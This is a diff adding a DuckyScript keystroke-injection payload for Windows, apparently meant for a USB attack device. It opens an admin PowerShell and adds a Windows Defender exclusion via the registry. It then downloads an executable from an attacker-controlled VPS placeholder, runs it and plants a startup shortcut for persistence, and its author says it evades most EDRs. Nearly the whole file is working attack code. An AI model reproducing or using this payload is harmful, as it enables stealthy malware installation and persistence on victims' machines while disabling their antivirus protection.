@@ -1,0 +1,86 @@
+REM Title: The-Perfect-Stealthy-Payload
+REM Author: zb0r
+REM Description: Opens PowerShell as admin, creates a folder in Windows/temp called Cache, adds exclusion in Defender, downloads the payload from VPS/ inside the Cache folder, executes it, and adds it to startup
+REM Target: Windows
+REM Note: This evades most EDRs. // Delay is too big for testing purposes, can be lowered significantly. // I removed every instance of my VPS.
+REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:4444) and the name of your payload (ex: Shelzy.exe)
+REM Version: 1.0
+DEFINE #VPSISHERE 0.0.0.0
+DEFINE #EXE_NAME Shelzy.exe
+DEFINE #PORT 4444
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 1500
+REM Create Cache folder in Windows/temp
+STRINGLN mkdir "$env:windir\temp\Cache"
+DELAY 500
+
+REM Add exclusion in Defender for Cache folder via registry manipulation
+STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
+DELAY 500
+
+REM Download payload from VPS Invoke-WebRequest
+STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:#PORT/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
+DELAY 3000
+
+REM Execute the downloaded payload
+STRINGLN Start-Process "$env:windir\temp\Cache\#EXE_NAME"
+DELAY 500
+
+REM Add #EXE_NAME to startup
+STRINGLN $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\#EXE_NAME";$s.Save()
+DELAY 500
+
+STRING EXIT
+DELAY 300
+ENTER
